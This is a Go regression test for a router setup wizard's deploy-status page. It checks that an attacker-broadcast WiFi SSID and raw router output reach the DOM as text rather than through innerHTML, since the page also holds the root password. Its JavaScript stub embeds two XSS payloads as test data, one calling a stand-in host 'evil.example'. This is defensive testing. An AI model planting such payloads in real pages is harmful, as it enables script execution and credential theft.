package main

import (
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
)

// dom_sink_test.go pins the render contract of the deploy-status view (pre-release
// audit finding C2-I-04).
//
// index.html used to build its step list and job log by string concatenation into
// innerHTML, and the strings involved carry an operator-selected WiFi SSID (which
// anyone in radio range can broadcast) plus raw router command output. The page is
// served from the wizard origin, which also holds #password (the router's root
// password) — so a payload that executes there can read the password out of the
// DOM. Untrusted values must therefore reach the DOM as TEXT.
//
// Two layers:
//   - TestDeployStatusSinkUsesTextNotHTML: the source contract. pollStatus() must
//     not use innerHTML for anything, and every innerHTML left in the page must be
//     a static placeholder or a clear.
//   - TestHostileSSIDAndRouterOutputRenderAsInertText: executes the REAL
//     pollStatus() under a recording DOM stub and shows that a hostile SSID and
//     hostile router output arrive as text and never through the HTML parser.

// safeInnerHTML matches the only innerHTML forms allowed to remain: a static
// <option> placeholder with no interpolation, or clearing a list.
var safeInnerHTML = regexp.MustCompile(`^[A-Za-z_$][\w$]*\.innerHTML = (''|'<option value="">[^'<>]*</option>');$`)

// TestDeployStatusSinkUsesTextNotHTML is the source contract for C2-I-04.
func TestDeployStatusSinkUsesTextNotHTML(t *testing.T) {
	html := string(indexHTML)

	// 1. The deploy-status renderer must not touch innerHTML at all: step
	//    descriptions, step details and log lines all carry untrusted strings.
	body := funcBody(t, html, "pollStatus")
	if strings.Contains(body, "innerHTML") {
		t.Errorf("pollStatus() must not use innerHTML — step.desc, step.detail and log msg carry the SSID and raw router output\n%s", body)
	}

	// 2. Nothing anywhere else in the page may interpolate a value into the
	//    innerHTML *setter*. Anything that is not one of the two safe forms fails.
	for i, line := range strings.Split(html, "\n") {
		if !strings.Contains(line, ".innerHTML") {
			continue
		}
		if !safeInnerHTML.MatchString(strings.TrimSpace(line)) {
			t.Errorf("index.html:%d interpolates into innerHTML — untrusted text must go through textContent/createTextNode:\n	%s", i+1, strings.TrimSpace(line))
		}
	}

	// 3. The values must be present as text sinks, so the fix is not "delete the
	//    rendering": step.desc, step.detail and the log message are still shown.
	for _, want := range []string{"textContent = step.desc", "textContent = step.detail", "createTextNode(' ' + l.msg)"} {
		if !strings.Contains(body, want) {
			t.Errorf("pollStatus() must render %s as text (found nothing matching)\n%s", want, body)
		}
	}
}

// jsDOMStub is a recording DOM: it keeps every textContent assignment, every
// appended text node, and — decisively — every value that ever went through the
// innerHTML setter. A stub cannot parse HTML, so the assertion is not "the script
// did not execute"; it is the property that matters: untrusted content never
// reaches the HTML parser in the first place.
const jsDOMStub = `
function makeEl(tag) {
  var el = {
    tagName: tag, className: '', id: '', children: [], _text: '', _innerHTMLSets: [],
    classList: { add: function () {}, remove: function () {}, contains: function () { return false; } },
    appendChild: function (c) { el.children.push(c); return c; }
  };
  Object.defineProperty(el, 'textContent', {
    get: function () { return el._text; },
    set: function (v) { el._text = String(v); el.children = []; }
  });
  Object.defineProperty(el, 'innerHTML', {
    get: function () { return el._text; },
    set: function (v) { el._innerHTMLSets.push(String(v)); el._text = String(v); el.children = []; }
  });
  return el;
}
var byId = {};
var document = {
  createElement: makeEl,
  createTextNode: function (v) { return { textNode: true, textContent: String(v) }; },
  getElementById: function (id) {
    if (!byId[id]) { byId[id] = makeEl('div'); byId[id].id = id; }
    return byId[id];
  }
};

var hostileSSID = '<svg onload=alert(1)>';
var hostileRouterOut = '<img src=x onerror=fetch("//evil.example")>';
var job = {
  status: 'running',
  steps: [
    { desc: 'STA mode: ' + hostileSSID, status: 'running', detail: 'router said: ' + hostileRouterOut },
    { desc: 'Installing tollgate-wrt', status: 'done', detail: '' }
  ],
  log: [
    { time: 0, msg: 'Configuring WiFi STA uplink: ' + hostileSSID },
    { time: 0, msg: 'apk: ' + hostileRouterOut }
  ],
  error: ''
};
function fetch() { return Promise.resolve({ json: function () { return Promise.resolve(job); } }); }
`

// jsDOMTrigger drives pollStatus once and dumps what the DOM received.
const jsDOMTrigger = `
(async function () {
  await pollStatus('job-1');
  function textOf(el) {
    var s = el._text || '';
    for (var i = 0; i < el.children.length; i++) {
      var c = el.children[i];
      s += c.textNode ? c.textContent : textOf(c);
    }
    return s;
  }
  function walk(el, out) {
    out.push({
      tag: el.tagName, className: el.className, text: textOf(el),
      elementChildren: el.children.filter(function (c) { return !c.textNode; }).length,
      textChildren: el.children.filter(function (c) { return !!c.textNode; }).length,
      htmlSets: el._innerHTMLSets
    });
    for (var i = 0; i < el.children.length; i++) {
      if (!el.children[i].textNode) walk(el.children[i], out);
    }
    return out;
  }
  var sets = [];
  var trees = [walk(byId['steps-list'], []), walk(byId['deploy-log'], [])];
  for (var t = 0; t < trees.length; t++) {
    for (var n = 0; n < trees[t].length; n++) {
      sets = sets.concat(trees[t][n].htmlSets);
    }
  }
  process.stdout.write(JSON.stringify({
    steps: trees[0], log: trees[1], htmlSets: sets,
    hostileSSID: hostileSSID, hostileRouterOut: hostileRouterOut
  }));
})();
`

type domNode struct {
	Tag         string   `json:"tag"`
	ClassName   string   `json:"className"`
	Text        string   `json:"text"`
	ElementKids int      `json:"elementChildren"`
	TextKids    int      `json:"textChildren"`
	HTMLSets    []string `json:"htmlSets"`
}

type domDump struct {
	Steps         []domNode `json:"steps"`
	Log           []domNode `json:"log"`
	HTMLSets      []string  `json:"htmlSets"`
	HostileSSID   string    `json:"hostileSSID"`
	HostileRouter string    `json:"hostileRouterOut"`
}

// TestHostileSSIDAndRouterOutputRenderAsInertText executes the REAL pollStatus()
// from the embedded page against a hostile job payload — an attacker-broadcast
// SSID and hostile "router output" — and asserts the payload arrives as text:
//
//   - nothing is ever handed to the innerHTML setter (so there is no HTML parse,
//     and no inline handler to fire in the origin that holds #password);
//   - the step detail still SHOWS the router output, and the log line still SHOWS
//     the SSID, verbatim, as text.
//
// The stub needs node; when node is absent the source contract above still guards
// the sink, and this test reports the skip rather than pretending to run.
func TestHostileSSIDAndRouterOutputRenderAsInertText(t *testing.T) {
	node, err := exec.LookPath("node")
	if err != nil {
		t.Skip("node not installed — skipping the executed DOM-sink check (the source contract test still runs)")
	}

	html := string(indexHTML)
	// funcBody returns "function pollStatus(...) {...}"; pollStatus is async.
	script := jsDOMStub + "\nasync " + funcBody(t, html, "pollStatus") + "\n" + jsDOMTrigger

	dir := t.TempDir()
	path := filepath.Join(dir, "dom_sink_check.js")
	if err := os.WriteFile(path, []byte(script), 0o600); err != nil {
		t.Fatalf("write harness: %v", err)
	}
	out, err := exec.Command(node, path).CombinedOutput()
	if err != nil {
		t.Fatalf("node harness failed: %v\n%s", err, out)
	}

	var dump domDump
	if err := json.Unmarshal(out, &dump); err != nil {
		t.Fatalf("harness did not return JSON: %v\n%s", err, out)
	}

	// 1. The HTML parser must never see untrusted content.
	if len(dump.HTMLSets) != 0 {
		t.Errorf("untrusted content went through innerHTML %d time(s) — an SSID such as %q would be parsed as markup in the origin that holds #password:\n%s",
			len(dump.HTMLSets), dump.HostileSSID, strings.Join(dump.HTMLSets, "\n"))
	}

	// 2. The hostile router output is still displayed — as text, in a node with no
	//    element children (i.e. it did not become markup).
	foundDetail := false
	for _, n := range dump.Steps {
		if !strings.Contains(n.ClassName, "step-detail") {
			continue
		}
		foundDetail = true
		if n.Text != "router said: "+dump.HostileRouter {
			t.Errorf("step detail text = %q, want %q", n.Text, "router said: "+dump.HostileRouter)
		}
		if n.ElementKids != 0 {
			t.Errorf("step detail spawned %d element(s) from router output — it must stay text", n.ElementKids)
		}
	}
	if !foundDetail {
		t.Error("no .step-detail node was rendered at all")
	}

	// 3. Same for the SSID carried in a log line. The line is exactly a timestamp
	//    span plus one text node, so the SSID is text — not markup. dump.Log[0] is
	//    the log container itself, whose text aggregates its children.
	if len(dump.Log) == 0 {
		t.Fatal("the deploy log was never populated")
	}
	foundLog := false
	for _, n := range dump.Log[1:] {
		if !strings.Contains(n.Text, dump.HostileSSID) {
			continue
		}
		foundLog = true
		if !strings.Contains(n.Text, "Configuring WiFi STA uplink: "+dump.HostileSSID) {
			t.Errorf("log line text = %q, want it to contain the SSID verbatim", n.Text)
		}
		if n.ElementKids != 1 || n.TextKids != 1 {
			t.Errorf("log line should be a timestamp span plus one text node, got %d element(s) and %d text node(s) — the SSID must stay text", n.ElementKids, n.TextKids)
		}
	}
	if !foundLog {
		t.Errorf("the SSID never reached the log view as text; rendered log was %+v", dump.Log)
	}
}
